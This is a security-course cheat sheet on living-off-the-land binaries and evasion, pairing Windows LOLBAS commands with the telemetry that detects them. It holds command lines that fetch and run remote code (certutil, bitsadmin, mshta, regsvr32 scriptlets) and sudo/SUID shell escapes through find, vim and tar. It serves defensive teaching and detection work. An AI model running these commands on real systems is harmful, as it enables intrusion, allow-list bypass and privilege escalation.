# Cheat sheet — Living-off-the-Land & Evasion

*Companion to [Module 14 — Living-off-the-Land & Evasion](README.md) · CC BY 4.0 — print it, pin it, share it.*

*Last reviewed: 2026-07*

> Only test systems you own or have explicit written permission to test. This is defensive
> education — every technique below is paired with the telemetry that detects it.

Living-off-the-land = using binaries **already installed, signed, and trusted** on the host, so there's
no malware file to flag. The catalogs: [LOLBAS](https://lolbas-project.github.io/) (Windows),
[GTFOBins](https://gtfobins.github.io/) (Unix). Evasion shifts detection from *signature* to
*behaviour* — it does not make you invisible.

## The LOLBin capability classes (what to look up)

Both catalogs tag binaries by verb — search by the capability you need:

```
Download   – pull a remote file using a trusted binary
Execute    – run code/script through a signed host binary
AWL bypass – defeat application allow-listing (AppLocker/WDAC)
Copy/Encode– stage, encode, or exfil data
Credentials– dump or access secrets
```

## Windows LOLBAS — download / execute (each with its detection)

```powershell
# certutil as a downloader — a cert tool has no business fetching EXEs
certutil.exe -urlcache -split -f https://host/f.txt out.txt
#   DETECT: certutil.exe with a URL arg; parent = Word/Excel is the tell (Sysmon 1)

# bitsadmin — legacy transfer service
bitsadmin /transfer j /download https://host/f https://... C:\...\f
#   DETECT: BITS-Client/Operational log; bitsadmin child processes

# mshta / rundll32 — signed binaries that execute script or DLL exports
mshta.exe https://host/payload.hta
rundll32.exe C:\...\evil.dll,EntryPoint
#   DETECT: mshta/rundll32 with a URL or odd export; network from mshta (Sysmon 3)

# regsvr32 "squiblydoo" — scriptlet execution, classic AWL bypass
regsvr32 /s /n /u /i:https://host/file.sct scrobj.dll
#   DETECT: regsvr32 with /i: and a URL; scrobj.dll load
```

## Unix GTFOBins — the shell-escape pattern

The recurring move: a binary you *are* allowed to run (via sudo, SUID, or a restricted shell) has a
feature that spawns a shell or reads files, so it inherits that privilege.

```bash
sudo -l                      # first: what am I allowed to run? map each hit on GTFOBins
find / -perm -4000 2>/dev/null   # SUID binaries — cross-reference every one on GTFOBins

# canonical escapes (only work where the binary is sudo/SUID-allowed):
sudo find . -exec /bin/sh \; -quit      # find's -exec spawns a shell
sudo vim -c ':!/bin/sh'                  # editor shell-out (less, awk, ed all do this)
sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
```

## AMSI / allow-listing context

- **AppLocker/WDAC** allow-lists trusted publishers — LOLBins pass because they *are* trusted. The
  bypass isn't magic; it's picking a signed binary the policy forgot to constrain.
- **Verify the defense before claiming a bypass:** `Get-AppLockerPolicy -Effective` shows what's
  actually enforced vs. audited.

## Gotchas worth remembering

- **"Evasion" ≠ "invisible."** You removed the *file* signature; you did not remove the *behaviour*.
  `certutil` spawned by `winword.exe` reaching out to the internet is wildly anomalous — the whole
  point of the module is that behavioural telemetry (Sysmon 1/3, command-line logging) still catches it.
- **Parent-child lineage is the detection goldmine.** Office → `certutil`/`mshta`/`powershell` is the
  signal defenders hunt. LOLBins that are normal alone are damning by ancestry.
- **Enable the telemetry first, or you're blind to your own test.** Command-line auditing (4688) and
  Sysmon are often off by default — if you can't see the technique's artifact, you haven't finished.
- **The catalogs are living docs.** Don't memorize invocations — memorize the *capability classes* and
  look up the exact syntax on LOLBAS/GTFOBins, which track new entries and detections.
- **`sudo -l` and the SUID sweep are the whole Unix game.** Enumeration beats cleverness: the escape is
  almost always a binary you were already permitted to run.
